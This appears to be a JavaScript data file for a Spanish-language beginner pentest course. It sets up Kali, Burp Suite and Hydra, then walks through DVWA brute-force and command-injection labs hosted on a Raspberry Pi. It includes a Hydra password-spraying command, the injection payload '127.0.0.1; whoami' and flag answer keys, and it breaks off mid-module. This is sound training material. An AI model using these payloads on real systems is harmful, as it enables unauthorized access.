// Datos curriculares estructurados para cada laboratorio
// Disenados con maxima claridad pedagogica, paso a paso guiado y explicaciones sencillas para usuarios principiantes.

// MODULO ESPECIAL: Instalacion y Preparacion de Herramientas
export const MODULO_INSTALACION = {
  id: 'instalacion-herramientas',
  esInstalacion: true,
  numero: 0,
  titulo: 'Instalacion y Preparacion de Herramientas',
  nivel: 'Basico',
  pasos: [
    {
      numero: 1,
      titulo: 'Requisitos previos del sistema',
      como: `Donde se hace: En tu computadora Windows (sin abrir aún ningún programa).

Objetivo: Comprobar que tu computadora tiene los recursos mínimos necesarios y la autorización del procesador para crear máquinas virtuales de práctica.

Paso a paso:
1. Presiona las teclas Ctrl + Shift + Esc al mismo tiempo para abrir el Administrador de Tareas.
2. Haz clic en la pestaña "Rendimiento" (arriba a la izquierda) y luego en "CPU".
3. En la parte inferior derecha, busca la palabra "Virtualización". Debe aparecer como "Habilitado" (o "Enabled").
4. Comprueba también que tu equipo tenga al menos 8 GB de memoria RAM y unos 40 GB de espacio libre en disco para alojar los entornos.

¿Por qué es necesario?: Para poder ejecutar Kali Linux dentro de tu computadora sin alterar tu Windows habitual, el procesador debe tener activada la tecnología de virtualización por hardware.

Como saber que funciono: Verás la palabra "Habilitado" en verde o texto claro junto a Virtualización en la sección de CPU.

En caso de problema: Si dice "Deshabilitado", reinicia tu PC y entra a la BIOS (presionando F2, F10, Supr o Del al encender). Busca "Intel Virtualization Technology" (VT-x) o "AMD SVM Mode" y cámbialo a "Enabled".`,
      payload: 'CPU: Virtualizacion habilitada | RAM: >= 8 GB | Disco: >= 40 GB libres',
      flag: 'FLAG{prep-hardware-virtualizacion-ok}',
      dondeEncontrarla: 'En el Administrador de Tareas de Windows (Rendimiento -> CPU).',
      quePoner: 'Escribe exactamente el estado que viste: Habilitado (o Enabled).',
      flagsAceptadas: ["Habilitado", "habilitado", "Habilitada", "Enabled", "enabled", "FLAG{prep-hardware-virtualizacion-ok}"],
      objetivoFlag: 'Verifica la virtualizacion por hardware habilitada y que cuentes con al menos 8 GB de RAM y 40 GB libres.'
    },
    {
      numero: 2,
      titulo: 'Descarga e instalacion de VirtualBox',
      como: `Donde se hace: En tu navegador web habitual en Windows.

Objetivo: Instalar Oracle VirtualBox, la aplicación gratuita que nos permitirá ejecutar computadoras virtuales completas dentro de tu sistema operativo.

Paso a paso:
1. Abre en tu navegador la página oficial: https://www.virtualbox.org/wiki/Downloads
2. En la sección "VirtualBox platform packages", haz clic en "Windows hosts" para descargar el instalador principal (.exe).
3. En la misma página, un poco más abajo, busca "Oracle VM VirtualBox Extension Pack" (en la sección "All supported platforms") y descárgalo también.
4. Ejecuta el instalador de VirtualBox que descargaste. Avanza haciendo clic en "Next" manteniendo todas las opciones recomendadas por defecto, acepta la advertencia temporal de red y pulsa "Install".
5. Al finalizar, abre VirtualBox. Ve al menú superior "Archivo" -> "Herramientas" (o "Preferencias") -> "Extensiones", haz clic en el botón "+" (Agregar), selecciona el archivo del Extension Pack descargado y acepta la licencia.

¿Por qué es necesario?: VirtualBox es el hipervisor donde vivirá Kali Linux. El Extension Pack añade soporte para pantallas de alta resolución, USB y mejor velocidad de trabajo.`,
      payload: 'https://www.virtualbox.org/wiki/Downloads',
      flag: 'FLAG{prep-virtualbox-extpack-instalado}',
      dondeEncontrarla: 'En la ventana de VirtualBox o en el menú de Extensiones instaladas.',
      quePoner: 'Escribe el nombre del programa instalado: VirtualBox',
      flagsAceptadas: ["VirtualBox", "virtualbox", "Oracle VM VirtualBox", "Extension Pack", "FLAG{prep-virtualbox-extpack-instalado}"],
      objetivoFlag: 'Descarga e instala Oracle VirtualBox junto al Extension Pack oficial.'
    },
    {
      numero: 3,
      titulo: 'Descarga de Kali Linux (imagen OVA preconfigurada)',
      como: `Donde se hace: En tu navegador web y en VirtualBox.

Objetivo: Descargar la máquina virtual oficial de Kali Linux ya armada y lista para usar, ahorrándote horas de instalación manual.

Paso a paso:
1. Ve al sitio oficial: https://www.kali.org/get-kali/#kali-virtual-machines
2. Busca la tarjeta que dice "VirtualBox" y haz clic en el botón de descarga directa (es un archivo .7z o .ova de aproximadamente 3 a 4 GB).
3. Si el archivo viene comprimido en formato .7z, haz clic derecho sobre él y extráelo con 7-Zip o WinRAR para obtener el archivo de la máquina virtual.
4. Abre VirtualBox, haz clic en el menú "Archivo" -> "Importar servicio virtualizado..." (o "Máquina" -> "Añadir...").
5. Selecciona el archivo extraído de Kali Linux, revisa que los valores vengan por defecto y presiona "Importar". Espera unos minutos mientras se importa la máquina.

¿Por qué es necesario?: Kali Linux es la distribución estándar de seguridad informática. Viene con cientos de herramientas de ciberseguridad listas para usar.`,
      payload: 'https://www.kali.org/get-kali/#kali-virtual-machines',
      flag: 'FLAG{prep-kali-ova-sha256-importada}',
      dondeEncontrarla: 'En la lista lateral de máquinas virtuales dentro de VirtualBox.',
      quePoner: 'Escribe el nombre del sistema que descargaste: kali linux (o simplemente kali).',
      flagsAceptadas: ["kali", "kali linux", "Kali", "Kali Linux", "FLAG{prep-kali-ova-sha256-importada}"],
      objetivoFlag: 'Descarga la maquina virtual Kali Linux OVA e importala en VirtualBox.'
    },
    {
      numero: 4,
      titulo: 'Configuracion de la maquina virtual Kali Linux',
      como: `Donde se hace: En la ventana principal de VirtualBox.

Objetivo: Asignar la cantidad correcta de memoria RAM, procesador y red para que Kali funcione con fluidez y pueda comunicarse con la Raspberry Pi.

Paso a paso:
1. En la columna izquierda de VirtualBox, haz clic sobre la máquina "Kali Linux" y luego en el botón con engranaje amarillo "Configuración".
2. Ve a la pestaña "Sistema" -> subpestaña "Placa base": asigna al menos 2048 MB (2 GB) de memoria RAM. Si tu equipo tiene 16 GB, puedes asignarle 4096 MB (4 GB).
3. En la subpestaña "Procesador": asigna al menos 2 CPUs (núcleos) para que el sistema responda rápido.
4. Ve a "Pantalla": sube la memoria de video a 128 MB.
5. Ve a "Red" -> "Adaptador 1": asegúrate de que esté configurado en modo "NAT" (para navegación básica hacia internet). Si vas a conectar con la Raspberry Pi por tu misma red física, puedes añadir el "Adaptador 2" en modo "Adaptador puente" (Bridge) o "Red solo-anfitrión".
6. Haz clic en el botón "Aceptar" abajo para guardar los cambios.`,
      payload: 'RAM: 2048-4096 MB | CPUs: 2+ | Video: 128 MB | Adaptador 1: NAT',
      flag: 'FLAG{prep-kali-vm-2cpu-4gb-nat}',
      dondeEncontrarla: 'En VirtualBox -> Configuración de Kali Linux -> pestaña Red.',
      quePoner: 'Escribe el modo de red configurado en el Adaptador 1: NAT',
      flagsAceptadas: ["NAT", "nat", "Nat", "FLAG{prep-kali-vm-2cpu-4gb-nat}"],
      objetivoFlag: 'Configura la memoria RAM (2-4 GB), 2 CPUs y adaptador de red NAT en la VM de Kali Linux.'
    },
    {
      numero: 5,
      titulo: 'Primer inicio de sesion en Kali Linux',
      como: `Donde se hace: Dentro de la ventana de la máquina virtual Kali Linux en VirtualBox.

Objetivo: Encender Kali Linux por primera vez, ingresar con las credenciales oficiales por defecto y actualizar la lista de programas.

Paso a paso:
1. En VirtualBox, selecciona "Kali Linux" y haz clic en la flecha verde "Iniciar".
2. Espera 1 o 2 minutos hasta ver la pantalla azul de bienvenida con los campos de inicio de sesión.
3. Escribe las credenciales oficiales de fábrica:
   • Usuario (Username): kali
   • Contraseña (Password): kali
   (Nota: todo en minúsculas).
4. Una vez cargado el escritorio, haz clic derecho en el fondo de pantalla y elige "Open Terminal Here" (Abrir terminal aquí).
5. En la terminal negra, escribe el comando para actualizar los repositorios:
   sudo apt update
   Presiona Enter. Te pedirá contraseña: escribe kali (por seguridad en Linux no se verán asteriscos al teclear, es completamente normal) y presiona Enter.`,
      payload: 'Usuario: kali\nContrasena: kali\n\nsudo apt update',
      flag: 'FLAG{prep-kali-login-apt-upgrade-listo}',
      dondeEncontrarla: 'En la pantalla de acceso o en la terminal de Kali Linux.',
      quePoner: 'Escribe el usuario por defecto de acceso a Kali: kali',
      flagsAceptadas: ["kali", "Kali", "FLAG{prep-kali-login-apt-upgrade-listo}"],
      objetivoFlag: 'Inicia sesion con el usuario kali y contrasena kali, y actualiza los repositorios del sistema.'
    },
    {
      numero: 6,
      titulo: 'Instalacion de las Guest Additions de VirtualBox',
      como: `Donde se hace: En el menú de VirtualBox y en la terminal de Kali Linux.

Objetivo: Habilitar que Kali Linux se adapte a pantalla completa y que puedas copiar y pegar texto libremente entre tu Windows y la máquina virtual.

Paso a paso:
1. En la terminal de Kali, instala primero las herramientas de compilación con este comando:
   sudo apt install -y build-essential dkms linux-headers-$(uname -r)
2. En la barra superior de la ventana de VirtualBox (en la ventana externa), haz clic en "Dispositivos" -> "Insertar imagen de CD de las Guest Additions...".
3. En la terminal de Kali, ejecuta estos dos comandos para montar el disco e instalarlo:
   sudo mount /dev/cdrom /mnt
   sudo /mnt/VBoxLinuxAdditions.run
4. Espera a que termine la instalación y reinicia Kali ejecutando:
   sudo reboot
5. Tras reiniciar, en el menú superior de VirtualBox ve a "Dispositivos" -> "Portapapeles compartido" y asegúrate de elegir "Bidireccional".`,
      payload: 'sudo apt install -y build-essential dkms linux-headers-$(uname -r)\nsudo mount /dev/cdrom /mnt && sudo /mnt/VBoxLinuxAdditions.run\nsudo reboot',
      flag: 'FLAG{prep-guest-additions-dkms-reboot}',
      dondeEncontrarla: 'En el menú Dispositivos de VirtualBox tras completar la instalación.',
      quePoner: 'Escribe el nombre del complemento instalado: Guest Additions',
      flagsAceptadas: ["Guest Additions", "guest additions", "GuestAdditions", "FLAG{prep-guest-additions-dkms-reboot}"],
      objetivoFlag: 'Instala Guest Additions en Kali Linux para habilitar pantalla completa y portapapeles compartido.'
    },
    {
      numero: 7,
      titulo: 'Descarga e instalacion de Burp Suite Community Edition',
      como: `Donde se hace: En Kali Linux (o en Windows si prefieres usarlo fuera de la VM).

Objetivo: Abrir Burp Suite, la herramienta esencial de auditoría web que nos permite interceptar, analizar y modificar el tráfico entre el navegador y las aplicaciones web.

Paso a paso:
1. ¡Buenas noticias!: En Kali Linux, Burp Suite ya viene preinstalado. Puedes abrirlo haciendo clic en el menú del dragón de Kali (arriba a la izquierda) -> "03 - Web Application Analysis" -> "burpsuite", o simplemente abriendo una terminal y escribiendo: burpsuite
2. Si prefieres usarlo en tu Windows anfitrión, puedes descargarlo gratis desde: https://portswigger.net/burp/communitydownload
3. Al abrir Burp Suite verás una ventana de bienvenida:
   • Deja seleccionada la opción "Temporary project" y haz clic en "Next".
   • Deja seleccionada la opción "Use Burp defaults" y haz clic en "Start Burp".
4. Se abrirá la interfaz principal con pestañas superiores como Dashboard, Target, Proxy, Intruder, Repeater.`,
      payload: 'burpsuite\nhttps://portswigger.net/burp/communitydownload',
      flag: 'FLAG{prep-burpsuite-community-listo}',
      dondeEncontrarla: 'En la ventana principal de Burp Suite tras iniciar el proyecto.',
      quePoner: 'Escribe el nombre de la herramienta: Burp Suite',
      flagsAceptadas: ["Burp Suite", "burp suite", "burpsuite", "BurpSuite", "FLAG{prep-burpsuite-community-listo}"],
      objetivoFlag: 'Ejecuta Burp Suite Community Edition y arranca un proyecto temporal por defecto.'
    },
    {
      numero: 8,
      titulo: 'Configuracion del Proxy Listener en Burp Suite',
      como: `Donde se hace: Dentro del programa Burp Suite.

Objetivo: Verificar que el proxy local esté activo y listo para escuchar el tráfico en el puerto 8080.

Paso a paso:
1. En Burp Suite, haz clic en la pestaña superior "Proxy".
2. Luego haz clic en la subpestaña "Proxy settings" (o pestaña "Options" en versiones clásicas).
3. En la sección "Proxy listeners" verás una tabla con una dirección. Debe decir:
   • Interface: 127.0.0.1:8080
   • Running: Debe tener la casilla marcada con un check.
4. Si la casilla está desmarcada, haz clic sobre ella para activarla. Si no existiera la fila, haz clic en "Add", escribe el puerto 8080, elige "Loopback only" (127.0.0.1) y haz clic en "OK".`,
      payload: 'Host: 127.0.0.1 | Puerto: 8080 | Estado: Activo (check verde)',
      flag: 'FLAG{prep-burp-proxy-listener-8080-on}',
      dondeEncontrarla: 'En Burp Suite -> pestaña Proxy -> Proxy Settings -> tabla Proxy Listeners.',
      quePoner: 'Escribe el número de puerto donde escucha el proxy: 8080',
      flagsAceptadas: ["8080", "127.0.0.1:8080", "FLAG{prep-burp-proxy-listener-8080-on}"],
      objetivoFlag: 'Verifica en Proxy Settings de Burp Suite que el listener en 127.0.0.1:8080 se encuentre activo con check verde.'
    },
    {
      numero: 9,
      titulo: 'Descarga e instalacion del certificado CA de Burp Suite',
      como: `Donde se hace: En el navegador Firefox (dentro de Kali o en Windows).

Objetivo: Instalar el certificado de seguridad de Burp Suite en Firefox para poder navegar en páginas seguras HTTPS sin que aparezcan errores ni advertencias de peligro.

Paso a paso:
1. Con Burp Suite abierto, abre Firefox.
2. Ve al menú de Firefox (tres líneas arriba a la derecha) -> "Ajustes" -> escribe "proxy" en el buscador y haz clic en "Configuración...".
3. Marca "Configuración manual del proxy", pon en Proxy HTTP: 127.0.0.1 y en Puerto: 8080. Marca la casilla "Usar también este proxy para HTTPS" y haz clic en "Aceptar".
4. En la barra de direcciones de Firefox escribe: http://burpsuite y presiona Enter.
5. En la esquina superior derecha de la página que cargue, haz clic en el botón "CA Certificate". Se descargará un archivo llamado cacert.der.
6. Vuelve a los Ajustes de Firefox, escribe "certificados" y haz clic en el botón "Ver certificados...".
7. Ve a la pestaña "Autoridades", haz clic en "Importar...", selecciona el archivo cacert.der descargado, marca la casilla "Confiar en esta CA para identificar sitios web" y pulsa "Aceptar".
8. Regresa a la configuración de red de Firefox y déjalo temporalmente en "Sin proxy" (en el siguiente paso usaremos una extensión para activarlo con un solo clic).`,
      payload: 'http://burpsuite -> Boton "CA Certificate" -> cacert.der\nFirefox: Ajustes -> Certificados -> Importar -> cacert.der',
      flag: 'FLAG{prep-burp-cacert-firefox-confiado}',
      dondeEncontrarla: 'En Firefox -> Ajustes -> Certificados -> pestaña Autoridades (PortSwigger).',
      quePoner: 'Escribe el nombre de la empresa creadora del certificado: PortSwigger (o el archivo cacert.der).',
      flagsAceptadas: ["PortSwigger", "portswigger", "cacert.der", "Portswigger", "FLAG{prep-burp-cacert-firefox-confiado}"],
      objetivoFlag: 'Descarga cacert.der desde http://burpsuite e importalo en Autoridades de Firefox marcando confianza para sitios web.'
    },
    {
      numero: 10,
      titulo: 'Instalacion y configuracion de FoxyProxy en Firefox',
      como: `Donde se hace: En tu navegador Firefox.

Objetivo: Agregar un botón práctico en Firefox que te permita encender o apagar el envío de tráfico a Burp Suite con un solo clic, sin desconfigurar tu navegador.

Paso a paso:
1. En Firefox, entra a la tienda oficial de complementos:
   https://addons.mozilla.org/firefox/addon/foxyproxy-standard/
2. Haz clic en "Añadir a Firefox" y luego en "Añadir" en el diálogo emergente.
3. Verás un nuevo icono con forma de zorro arriba a la derecha. Haz clic en él y elige "Options" (Opciones).
4. Haz clic en el botón "Add" (Añadir) para crear un nuevo perfil:
   • Title/Name: Burp
   • Proxy Type: HTTP
   • Hostname: 127.0.0.1
   • Port: 8080
5. Haz clic en "Save" (Guardar).
6. Cada vez que vayas a realizar un laboratorio, haz clic en el zorrito y selecciona el perfil "Burp". Cuando termines el ejercicio, cámbialo a "Turn Off" o "Disable" para navegar con normalidad por internet.`,
      payload: 'Firefox Add-on: FoxyProxy Standard\nPerfil Burp: HTTP | 127.0.0.1 | Puerto 8080',
      flag: 'FLAG{prep-firefox-foxyproxy-burp-guardado}',
      dondeEncontrarla: 'En la extensión FoxyProxy en la lista de perfiles creados.',
      quePoner: 'Escribe el nombre que le diste al perfil creado: Burp',
      flagsAceptadas: ["Burp", "burp", "BURP", "FLAG{prep-firefox-foxyproxy-burp-guardado}"],
      objetivoFlag: 'Instala FoxyProxy Standard en Firefox y crea el perfil Burp direccionando al puerto 8080.'
    },
    {
      numero: 11,
      titulo: 'Instalacion de Hydra y diccionario rockyou en Kali Linux',
      como: `Donde se hace: En la terminal de Kali Linux.

Objetivo: Dejar listo el programa Hydra y el diccionario de contraseñas rockyou.txt para los laboratorios de pruebas de autenticación.

Paso a paso:
1. Abre una terminal en Kali Linux.
2. Comprueba que Hydra esté instalado escribiendo:
   hydra --version
   (En Kali ya viene preinstalado; si no apareciera, instálalo con: sudo apt install -y hydra).
3. Kali incluye una lista famosa con millones de contraseñas llamada rockyou.txt.gz, pero viene comprimida. Para descomprimirla y dejarla lista, ejecuta este comando:
   sudo gunzip /usr/share/wordlists/rockyou.txt.gz
4. Verifica que ya esté descomprimida escribiendo:
   ls -lh /usr/share/wordlists/rockyou.txt
   (Verás que pesa unos 134 MB con millones de contraseñas reales).`,
      payload: 'hydra --version\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\nls -lh /usr/share/wordlists/rockyou.txt',
      flag: 'FLAG{prep-hydra-rockyou-descomprimido}',
      dondeEncontrarla: 'En la terminal de Kali Linux tras ejecutar ls en /usr/share/wordlists/.',
      quePoner: 'Escribe el nombre del archivo de contraseñas descomprimido: rockyou.txt',
      flagsAceptadas: ["rockyou.txt", "rockyou", "rockyou.txt.gz", "FLAG{prep-hydra-rockyou-descomprimido}"],
      objetivoFlag: 'Confirma hydra --version y descomprime la lista rockyou.txt en el directorio de wordlists de Kali.'
    },
    {
      numero: 12,
      titulo: 'Configuracion de red para alcanzar la Raspberry Pi',
      como: `Donde se hace: En tu red local y en la terminal de tu computadora o de Kali.

Objetivo: Conocer la dirección IP asignada a tu Raspberry Pi (donde están instalados los laboratorios) y verificar que responde correctamente.

Paso a paso:
1. Asegúrate de que la Raspberry Pi esté encendida y conectada al mismo router o red Wi-Fi/cable que tu máquina.
2. Para conocer su dirección IP puedes:
   • Conectar pantalla y teclado a la Pi y escribir: hostname -I
   • O mirar la lista de dispositivos conectados en el panel de administración de tu router.
3. Abre una terminal en tu equipo y comprueba la comunicación enviando un paquete de prueba:
   ping <IP_DE_TU_PI> (por ejemplo: ping 192.168.1.50)
4. Si recibes respuestas como "bytes=32 tiempo=... TTL=...", la conexión es exitosa.
5. Anota esa dirección IP: la ingresarás en la casilla superior de esta plataforma web para abrir los laboratorios:
   • DVWA: http://<IP_PI>/dvwa/
   • Juice Shop: http://<IP_PI>:3000`,
      payload: 'hostname -I\nping <IP_PI>\n\nDVWA: http://<IP_PI>/dvwa/\nJuice Shop: http://<IP_PI>:3000',
      flag: 'FLAG{prep-ping-raspberrypi-conectado}',
      dondeEncontrarla: 'En la terminal tras enviar la orden ping exitosa.',
      quePoner: 'Escribe el nombre del comando usado para comprobar la conexión: ping',
      flagsAceptadas: ["ping", "PING", "ping <IP_PI>", "FLAG{prep-ping-raspberrypi-conectado}"],
      objetivoFlag: 'Obten la direccion IP de la Raspberry Pi y verifica que responda al comando ping desde tu maquina.'
    },
    {
      numero: 13,
      titulo: 'Verificacion final: Prueba de intercepcion con Burp Suite',
      como: `Donde se hace: Con Firefox y Burp Suite trabajando de forma conjunta.

Objetivo: Aprender a pausar una petición web antes de que llegue a internet, inspeccionar su contenido y dejarla continuar.

Paso a paso:
1. Abre Burp Suite y ve a la pestaña superior "Proxy" -> subpestaña "Intercept".
2. Asegúrate de que el botón diga "Intercept is on" (activado). Si dice "Intercept is off", haz clic en él para activarlo.
3. En tu navegador Firefox, haz clic en el icono del zorrito de FoxyProxy y selecciona el perfil "Burp".
4. En la barra de direcciones de Firefox, entra a la dirección de DVWA:
   http://<IP_PI>/dvwa/
   y presiona Enter.
5. Notarás que Firefox parece quedarse pensando... ¡Eso es normal y significa que funcionó!
6. Cambia a la ventana de Burp Suite: verás la petición web detenida en texto claro, mostrando encabezados HTTP y cookies.
7. Haz clic en el botón "Forward" (Adelantar) en Burp Suite para dejar pasar la solicitud hacia el servidor.
8. Vuelve a Firefox y verás que la página de DVWA acaba de cargar por completo.
9. ¡Enhorabuena! Tu entorno de laboratorio está 100% configurado y listo para comenzar los retos.`,
      payload: 'Proxy -> Intercept is on -> Navega a http://<IP_PI>/dvwa/ -> Forward\nHistorial: Proxy -> HTTP history',
      flag: 'FLAG{prep-burp-intercepcion-dvwa-exitosa}',
      dondeEncontrarla: 'En la primera línea de la petición capturada en Burp Suite.',
      quePoner: 'Escribe el método HTTP que viste en la primera línea de la petición: GET',
      flagsAceptadas: ["GET", "get", "Get", "FLAG{prep-burp-intercepcion-dvwa-exitosa}"],
      objetivoFlag: 'Activa la intercepcion con FoxyProxy en modo Burp y envia una peticion HTTP a DVWA haciendo Forward con exito.'
    }
  ]
};

export const ROADMAP_MODULOS = {
  DVWA: {
    nombre: 'Damn Vulnerable Web Application (DVWA)',
    categoria: 'OWASP Top 10 Clasico',
    modulos: [
      {
        id: 'dvwa-brute-force',
        numero: 1,
        titulo: 'Fuerza Bruta en Autenticacion',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Inicio de sesion en DVWA y ajuste del nivel de seguridad',
            como: `Donde se hace: En el navegador Firefox (asegúrate de que en Burp Suite "Intercept is off" para navegar libremente).

Objetivo: Iniciar sesión por primera vez en la aplicación de práctica DVWA y fijar la dificultad en el nivel más sencillo ("Low").

Paso a paso:
1. Abre Firefox y navega a la URL de DVWA en tu Raspberry Pi (por ejemplo: http://192.168.1.50/dvwa/).
2. En la pantalla de bienvenida, escribe las credenciales por defecto:
   • Username: admin
   • Password: password
   Luego haz clic en el botón azul "Login".
3. En el menú lateral izquierdo de DVWA, busca y haz clic en la opción "DVWA Security".
4. En el menú desplegable, selecciona "Low" (Bajo) y presiona el botón "Submit".

¿Por qué hacemos esto?: El nivel "Low" desactiva todas las protecciones del código para que puedas ver y entender con total claridad cómo ocurren los fallos de seguridad sin toparte con filtros complejos.

Como saber que funciono: En la parte inferior de la pantalla o en el mensaje verde verás: "Security Level set to low".`,
            payload: 'Usuario: admin\nContrasena: password\nSecurity Level: Low',
            flag: 'FLAG{dvwa-security-low-ready}',
            dondeEncontrarla: 'En la pantalla de DVWA, observando el mensaje de confirmación o el pie de página.',
            quePoner: 'Escribe el nivel de seguridad configurado: low',
            flagsAceptadas: ["low", "Low", "LOW", "Security Level set to low", "FLAG{dvwa-security-low-ready}"],
            objetivoFlag: 'Ingresa la flag una vez hayas iniciado sesion correctamente como admin y veas "Security Level set to low" en DVWA.'
          },
          {
            numero: 2,
            titulo: 'Capturar peticion de autenticacion con Burp Suite',
            como: `Donde se hace: Con Firefox y Burp Suite trabajando juntos.

Objetivo: "Pausar" en el aire un intento de inicio de sesión para ver qué datos envía el navegador hacia el servidor.

Paso a paso:
1. En el menú lateral izquierdo de DVWA, haz clic en la sección "Brute Force".
2. Ve a Burp Suite, entra a la pestaña "Proxy" -> "Intercept" y asegúrate de que el botón diga "Intercept is on" (activado).
3. En Firefox, activa el perfil "Burp" en tu extensión FoxyProxy.
4. En el formulario de login de DVWA, escribe un usuario cualquiera (ej: admin) y una contraseña inventada (ej: prueba123), y haz clic en el botón "Login".
5. Cambia a la ventana de Burp Suite: verás la petición detenida en pantalla. Observa la primera línea que empieza con:
   GET /dvwa/vulnerabilities/brute/?username=admin&password=prueba123...

¿Qué significa esto?: Los datos viajan en texto plano como parámetros en la propia dirección web (URL) mediante el método HTTP GET.`,
            payload: 'GET /dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login',
            flag: 'FLAG{brute-get-params-captured}',
            dondeEncontrarla: 'En Burp Suite en Proxy -> Intercept. Puedes ingresar la línea GET completa capturada o el parámetro de usuario (username).',
            quePoner: 'Escribe el nombre del parámetro donde viaja el usuario: username',
            flagsAceptadas: [
              "username",
              "admin",
              "username=admin",
              "vulnerabilities/brute",
              "GET /vulnerabilities/brute",
              "GET /dvwa/vulnerabilities/brute",
              "GET /vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1",
              "GET /dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1",
              "FLAG{brute-get-params-captured}"
            ],
            objetivoFlag: 'Ingresa la flag cuando veas la peticion GET interceptada en Burp Suite con los parametros username y password visibles.'
          },
          {
            numero: 3,
            titulo: 'Identificar mensaje de fallo',
            como: `Donde se hace: En Burp Suite y en el navegador Firefox.

Objetivo: Descubrir qué mensaje exacto muestra la página web cuando la contraseña es errónea, para que una herramienta automática sepa cuándo falló un intento.

Paso a paso:
1. En Burp Suite, haz clic en el botón "Forward" para dejar pasar la petición con contraseña errónea.
2. En Firefox, desactiva temporalmente el proxy (en FoxyProxy elige "Disable" o en Burp pon "Intercept is off").
3. Observa el mensaje de error rojo que aparece debajo del formulario en DVWA. Dice textualmente:
   Username and/or password incorrect.

¿Por qué es necesario?: Los programas automáticos de ataque no ven la pantalla como una persona; necesitan buscar esa frase textual en el código recibido para saber si la contraseña fue rechazada o si lograron entrar.`,
            payload: 'Cadena de fallo: Username and/or password incorrect.',
            flag: 'FLAG{brute-fail-string-identified}',
            dondeEncontrarla: 'En el mensaje de error rojo que muestra DVWA tras enviar una contraseña incorrecta.',
            quePoner: 'Escribe el mensaje de error que viste: Username and/or password incorrect.',
            flagsAceptadas: ["Username and/or password incorrect.", "Username and/or password incorrect", "username and/or password incorrect.", "incorrect", "FLAG{brute-fail-string-identified}"],
            objetivoFlag: 'Ingresa la flag cuando puedas leer el mensaje exacto de error en la respuesta HTTP de DVWA para credenciales incorrectas.'
          },
          {
            numero: 4,
            titulo: 'Lanzar ataque automatizado con Hydra',
            como: `Donde se hace: En la terminal de tu máquina Kali Linux.

Objetivo: Usar la herramienta Hydra para probar automáticamente miles de contraseñas por segundo desde el diccionario rockyou.txt hasta descifrar la clave del administrador.

Paso a paso:
1. Para que el servidor reconozca tu sesión de DVWA, necesitas tu cookie llamada PHPSESSID.
2. En Firefox (con sesión iniciada en DVWA), presiona F12 para abrir las herramientas de desarrollador. Ve a "Almacenamiento" (o "Storage") -> "Cookies" -> haz clic en la IP de tu Pi y copia el valor de la fila PHPSESSID (es una cadena alfanumérica).
3. En la terminal de Kali Linux, pega este comando reemplazando <IP_LAB> por la IP de tu Raspberry Pi y <COOKIE> por el valor de tu PHPSESSID:
   hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_LAB> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=<COOKIE>"
4. Presiona Enter. Hydra comenzará a probar palabras hasta que se detenga y muestre en verde:
   [80][http-get-form] host: <IP> login: admin password: password

¿Qué hace este comando?: -l define el usuario objetivo (admin), -P indica la lista de contraseñas rockyou.txt, y :F=incorrect le dice a Hydra que ignore las respuestas que contengan la palabra "incorrect".`,
            payload: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_LAB> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=<COOKIE>"',
            flag: 'FLAG{hydra-cracked-admin-password}',
            dondeEncontrarla: 'En la salida de tu terminal de Kali Linux al terminar Hydra, en la línea que indica password encontrada.',
            quePoner: 'Escribe la contraseña que descubrió Hydra para admin: password',
            flagsAceptadas: ["password", "Password", "admin:password", "FLAG{password}", "FLAG{hydra-cracked-admin-password}"],
            objetivoFlag: 'Ingresa la flag cuando Hydra muestre en pantalla "[80][http-get-form] host: <IP> login: admin password: password" confirmando la contrasena encontrada.'
          }
        ]
      },
      {
        id: 'dvwa-command-injection',
        numero: 2,
        titulo: 'Inyeccion de Comandos del Sistema',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Verificar funcionamiento legitimo',
            como: `Donde se hace: En Firefox, en la sección "Command Injection" de DVWA.

Objetivo: Comprender cuál es el uso legítimo previsto para este formulario (comprobar la conectividad enviando un ping a una dirección IP).

Paso a paso:
1. En el menú lateral de DVWA, haz clic en "Command Injection".
2. En la casilla "Enter an IP address", escribe: 127.0.0.1 (la dirección local de tu propio equipo).
3. Haz clic en el botón "Submit".
4. Espera 2 o 3 segundos. Verás aparecer un cuadro negro con la respuesta típica del comando ping generado internamente por la Raspberry Pi.

¿Qué está ocurriendo?: El servidor web toma el texto que escribiste y ejecuta internamente en el sistema operativo Linux la orden: ping -c 4 127.0.0.1.`,
            payload: '127.0.0.1',
            flag: 'FLAG{cmdi-ping-response-seen}',
            dondeEncontrarla: 'En el recuadro negro debajo del formulario donde se muestra la salida del comando ping.',
            quePoner: 'Escribe el tamaño en bytes de los paquetes reportado en el ping: 64 bytes (o simplemente 64)',
            flagsAceptadas: ["64 bytes", "64", "64 bytes from 127.0.0.1", "FLAG{cmdi-ping-response-seen}"],
            objetivoFlag: 'Ingresa la flag cuando veas la salida del comando ping devuelta por el servidor, con lineas como "64 bytes from 127.0.0.1" en la pagina.'
          },
          {
            numero: 2,
            titulo: 'Concatenar segundo comando con punto y coma',
            como: `Donde se hace: En el mismo campo "Enter an IP address" de Command Injection en DVWA.

Objetivo: Engañar al servidor para que, además del ping, ejecute un segundo comando del sistema operativo que nosotros elijamos.

Paso a paso:
1. En la casilla "Enter an IP address", escribe la IP seguida de un punto y coma y la orden whoami:
   127.0.0.1; whoami
2. Haz clic en "Submit".
3. Mira la parte inferior del recuadro negro de resultados: justo debajo del ping verás aparecer la palabra www-data.

¿Por qué funciona?: En Linux, el símbolo punto y coma (;) sirve para separar dos órdenes independientes. El servidor ejecuta el ping y enseguida ejecuta whoami ("¿quién soy?"). Como el servidor web corre bajo el usuario web del sistema operativo, responde www-data.`,
            payload: '127.0.0.1; whoami',
            flag: 'FLAG{cmdi-whoami-www-data}',
            dondeEncontrarla: 'En el recuadro negro de la página justo debajo del resultado de ping, donde aparece el usuario.',
            quePoner: 'Escribe el nombre del usuario web del sistema que apareció: www-data',
            flagsAceptadas: ["www-data", "www data", "FLAG{www-data}", "FLAG{cmdi-whoami-www-data}"],
